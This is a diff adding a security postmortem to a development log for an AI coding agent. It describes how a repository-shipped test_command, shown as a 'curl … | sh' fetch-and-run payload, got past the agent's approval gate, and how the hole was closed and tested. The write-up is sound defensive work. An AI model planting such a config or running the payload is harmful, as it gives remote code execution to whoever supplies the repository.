@@ -899,3 +899,80 @@ scoring rounds graded *polish*, not *milestone DoD* — "10/10 unanimous" measur
 while the release gate lived in a different file it never read. Releasing (tagging + pushing) is
 a decision, not a polish step; autonomous runs may prepare a release but the tag push needs the
 maintainer's explicit go.
+
+---
+
+## 23. A repo-shipped `test_command` ran with the approval gate bypassed — clone-to-RCE, closed — 2026-10-01
+
+**The finding.** Found by running `COMPLETION-PLAN.md`'s own done-commands rather than by reading
+a roadmap. The chain, each link verified in code:
+
+```
+SettingsStore::path()          →  getcwd().'/.paider/settings.json'   // a REPOSITORY ships this
+readPath()                     →  the project file WINS over the user's XDG file
+testCommand()                  →  reads "test_command" out of it
+Loop::runPostPatchTests()      →  $shell->execute([... 'approval' => 'allow-once'])
+                                  // "Bypass gate: test_command is explicit user config"
+```
+
+Clone a repository carrying `.paider/settings.json` = `{"test_command": "curl … | sh"}`, let the
+model make one ordinary `write_file` — which needs no prompt, because only `SecretsGuard`-shaped
+paths are gated — and the command executes. No gate, no prompt, no `PAIDER_YOLO`, no `--yolo`.
+
+**Why it survived.** Four reasons, and the combination is the lesson:
+
+1. **The comment asserted the opposite of the code.** "explicit user config" described the
+   intended source; the code's actual precedence took the repository's. A comment that explains
+   why code is safe is not a check that it is.
+2. **A test asserted the hole was correct** — *"the gate is bypassed for the configured
+   test_command (allow-once, no approval prompt)"*. The bypass had become the specification.
+3. **Nothing recorded it.** `grep test_command DECISIONS.md` → zero hits. The security narrative in
+   §15/§17/§18 does not mention it.
+4. **A prior review pass had already seen it and written it down without fixing it** —
+   `council_meetings/top5-execute/research.md` records "the post-patch test hook bypasses the gate
+   ONLY for the user-configured test_command". A finding captured in prose and never routed to a
+   fix is indistinguishable from a finding not made.
+
+**The ruling.** Split on **authorship**, not on location. A repository may still *state* what its
+test command is; it may not *authorise* it.
+
+- Operator's own XDG config (`~/.config/paider/settings.json`, `$XDG_CONFIG_HOME` first) →
+  `operator_authored: true` → still skips the gate. Re-prompting on every patch for a command the
+  human typed would train them to hit "y" without reading, which is the reflex the gate exists to
+  prevent.
+- Repository-shipped → presented to the gate like any other model-adjacent command, with the
+  origin in the subject string so the prompt cannot read as a shell call the model just decided to
+  make.
+
+`SettingsStore::testCommandSource()` returns `{command, operator_authored}`. Precedence is
+unchanged — project still wins — so an operator who sets a project command still gets it; it just
+cannot skip the gate. A declined repo command returns `null`, **not** a failed `ToolResult`: the
+write succeeded and stands, and reporting it as a failure would tell the model its edit did not
+land when it did.
+
+**This is the same rule that closed the `mcp.json` hole, applied one layer over.** From
+`McpClient`: *"PAIDER_MCP is a preference (which servers I want), not a permission (I authorise this
+code to run) … only a path the operator names can supply a command."* A `test_command` is a shell
+command this process spawns. It was never a preference. The general statement is now in
+`ProjectEnv` and repeated in `SECURITY.md`: **convenience settings may live in a project file;
+permissions may not.**
+
+**How it is proved.** The load-bearing assertion is on disk, not on a mock — the repo's command
+touches a real `PWNED` file and the test asserts that file does not exist. Same shape as the
+`mcp.json` test, for the same reason: "a prompt was reached" is weaker evidence than "the command
+did not run". Mutation-checked — neutering the condition to `if (true)` fails both security tests.
+
+Four existing tests encoded the bypass and were moved to the operator path, which is what they were
+actually testing (the feedback loop, not the bypass). Suite 621 passing.
+
+**Consequences, forward-only:**
+- `SECURITY.md` now exists and cites code as the authority for the eight boundaries that were
+  previously recorded **only** in code and tests — `UrlGuard`, `ProjectEnv`, the `mcp.json` refusal,
+  `SkillLibrary`, `LibraryIndex`/`VettedItems`, `ProseStream`, `TerminalSafe`, `SecretsGuard`.
+- The **known gaps** are listed there rather than omitted, led by the one that matters most:
+  ordinary (non-secret-shaped) file writes are not prompted at all. That is a deliberate design
+  choice and it is also the real blast radius of a prompt injection.
+- The test file's four `setTestCommand()` call sites became `operatorTestCommand()`. If a future
+  change routes a repo-shipped command past the gate again, those tests do **not** catch it — the
+  two new ones do. That asymmetry is intentional and is the reason the new tests assert on a
+  filesystem side effect rather than on a prompt being reached.
